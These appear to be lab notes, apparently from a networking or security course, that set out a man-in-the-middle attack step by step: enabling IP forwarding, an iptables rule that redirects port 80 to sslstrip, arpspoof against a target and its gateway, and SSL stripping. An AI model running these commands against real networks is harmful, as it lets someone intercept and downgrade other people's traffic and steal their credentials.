change kernel configuration and iptables to forward traffic from one target to another (victim <-> gateway) -> arp poisoning -> ssl stripping


enable IP forwarding by kernel:  
`sudo sysctl net.ipv4.ip_forward=1`   
`sysctl` is a tool for examining and changing kernel parameters at runtime  
OR  
`sudo su` (has to use `su` bcos redirection)  
`echo "1" > /proc/sys/net/ipv4/ip_forward`  

for change persistent after reboot edit `/etc/sysctl.d/30-ipforward.conf`  
e.g.  
```
net.ipv4.ip_forward=1
net.ipv6.conf.default.forwarding=1
net.ipv6.conf.all.forwarding=1
```


Configure iptables:  
`iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 9999`  
`sslstrip` will listen on 9999, thus working only on to-be-redirected HTTPs  

`iptables` run as `systemd` service. To start on reboot you have to `enable` it.   
rules to be loaded are located in `/etc/iptables/iptables.rules` for `iptables.service` and in `/etc/iptables/ip6tables.rules` for `ip6tables.service`      
to save rules passed via cli to conf file: `iptables-save -f` `/etc/iptables/iptables.rules`   
if conf file edited - `reload` via `systemctl`   

ARP poisoning like in [zad8](zad8.md)  
OR  
`sudo apt install dsniff` dsniff contains i.a. `arpspoof`  
`sudo arpspoof -i eth0 -t <targetIP> <IP I'm supposed to be (gateway)>`

`sslstrip -l 9999`     